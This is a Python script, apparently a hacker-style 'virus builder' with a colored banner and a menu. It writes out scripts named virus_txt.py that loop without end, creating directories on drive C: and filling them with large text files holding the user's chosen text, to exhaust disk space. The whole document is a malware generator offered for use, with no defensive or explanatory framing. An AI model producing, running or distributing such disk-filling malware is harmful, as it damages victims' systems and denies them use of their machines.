# -*- coding: utf-8 -*-
import os , time
from colorama import Fore as c
def pr(txt):
    for x in txt:
        print(x, end='', flush=True)  
        time.sleep(0.000001)
        
def not_pad():
    if os.name == 'nt':
        
            os.system('cls')
    else:
            os.system('clear') 
    pr(c.YELLOW+'''
           
    ┌─┐┬  ┌─┐  ┌─┐┌─┐┌─┐┬ ┬┬─┐┬┌┬┐┬ ┬   ┌─┐┬ ┬┌┐ ┌─┐┬─┐
    ├┤ │  ├┤   └─┐├┤ │  │ │├┬┘│ │ └┬┘   │  └┬┘├┴┐├┤ ├┬┘
    └─┘┴─┘└────└─┘└─┘└─┘└─┘┴└─┴ ┴  ┴────└─┘ ┴ └─┘└─┘┴└─
    \n''')
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    pr(f'''\n
{c.YELLOW}+-------------------------------------+
{c.YELLOW} |                                     |
{c.YELLOW} |{c.RED}==={c.MAGENTA}>{c.CYAN}[1]{c.GREEN}More files and less size      |
{c.YELLOW} |                                     |
{c.YELLOW} |{c.RED}====={c.MAGENTA}>{c.CYAN}[2]{c.GREEN}Less files and more volume  |
{c.YELLOW} |                                     |
{c.YELLOW} +-------------------------------------+
       ''')
    res = input(f"\n{c.WHITE}root&@elf:~# {c.RED}Enter The Number: ~#{c.RESET}")
    pr(f'{c.LIGHTMAGENTA_EX}+'+'-'*50+"+\n")
    if res == '1':
        pass
        matn = input(f'\n{c.WHITE}root&@elf:~# {c.RED}Enter The Text: ')
        virus = f'''
        import random
        import os
        while True:
            os.chdir('C:')
            a = random.randint(1 ,1000000000000)
            b = str(a)
            os.makedirs(b)
            os.chdir(b)
            try:
                a = random.randint(1 ,1000000000000)
                for i in range(200):
                    txt = open(b+".txt" , 'w+')
                    for i in range(100):
                        txt.write('{matn}')
            except:
                break

        '''
        try:
            os.chdir('output')
        except:
            pass
        file = open('virus_txt.py' , 'w+')
        file.write(virus)
    if res == '2':
        matn = input()
        virus_1 = f'''
        import random
        import os
        while True:
            os.chdir('C:')
            a = random.randint(1 ,10)
            b = str(a)
            os.makedirs(b)
            os.chdir(b)
            try:
                a = random.randint(1 ,100)
                for i in range(200):
                    txt = open(b+".txt" , 'w+')
                    for i in range(1000000000000000000):
                        txt.write('{matn}')
                        
            except:
                break
            '''
        os.chdir('output')
        file_1 = open('virus_txt_windows_2.py' , 'w+')
        file_1.write(virus_1)
    pr(f"{c.WHITE}root&@elf:~# {c.GREEN}The file was created")
    time.sleep(5)
    if os.name == 'nt':
    
        os.system('cls')
    else:
        os.system('clear')    
